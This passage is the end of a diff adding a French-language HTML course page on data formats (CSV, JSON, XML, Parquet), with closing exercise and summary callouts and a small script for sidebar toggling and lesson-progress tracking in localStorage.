+        Appliquer cette checklist une seule fois au lancement d'un projet puis ne plus jamais la reconsidérer, alors que la valeur réelle de cette démarche vient de sa répétition périodique face à un contexte qui évolue continuellement (Module 6, leçon 4). Une checklist de choix de format est un outil vivant, pas une validation ponctuelle à cocher une fois pour toutes.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        En appliquant les cinq étapes de la checklist ci-dessus à un projet réel que vous connaissez (professionnel ou personnel), identifiez le format actuellement utilisé et déterminez s'il reste le choix le plus adapté aujourd'hui, ou si un des signaux de réévaluation mentionnés justifierait de reconsidérer ce choix.
+      </div>
+
+      <div class="callout" style="border-left-color:#2e7d5b; background:#e5f2ec;">
+        <strong>Fin du cours</strong>
+        Vous disposez maintenant d'une compréhension approfondie de CSV, JSON, XML et Parquet — leur anatomie, leurs pièges spécifiques, leurs mécanismes de performance, et la méthode pour choisir et faire évoluer un format en fonction d'un contexte réel plutôt que d'une préférence arbitraire. Ce cours clôt le Bloc 1 (Fondations Data) du cursus. Le Bloc 2 abordera le nettoyage de données en profondeur : déduplication, gestion des valeurs manquantes, détection d'anomalies et validation de schéma.
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  hljs.highlightAll();
+
+  const sidebar = document.getElementById('sidebar');
+  document.getElementById('menuToggle').addEventListener('click', () => {
+    sidebar.classList.toggle('open');
+  });
+
+  const lessonLinks = document.querySelectorAll('[data-lesson]');
+  const storageKey = 'course-progress-' + (document.title || 'default');
+  const done = JSON.parse(localStorage.getItem(storageKey) || '{}');
+
+  function updateProgressBar() {
+    const total = lessonLinks.length;
+    const completed = Object.values(done).filter(Boolean).length;
+    document.getElementById('progressFill').style.width = (completed / total * 100) + '%';
+  }
+
+  lessonLinks.forEach(link => {
+    const id = link.dataset.lesson;
+    if (done[id]) link.querySelector('.lesson-check').classList.add('done');
+
+    link.addEventListener('click', () => {
+      done[id] = true;
+      localStorage.setItem(storageKey, JSON.stringify(done));
+      link.querySelector('.lesson-check').classList.add('done');
+      lessonLinks.forEach(l => l.classList.remove('active'));
+      link.classList.add('active');
+      updateProgressBar();
+      sidebar.classList.remove('open');
+    });
+  });
+
+  updateProgressBar();
+</script>
+</body>
+</html>
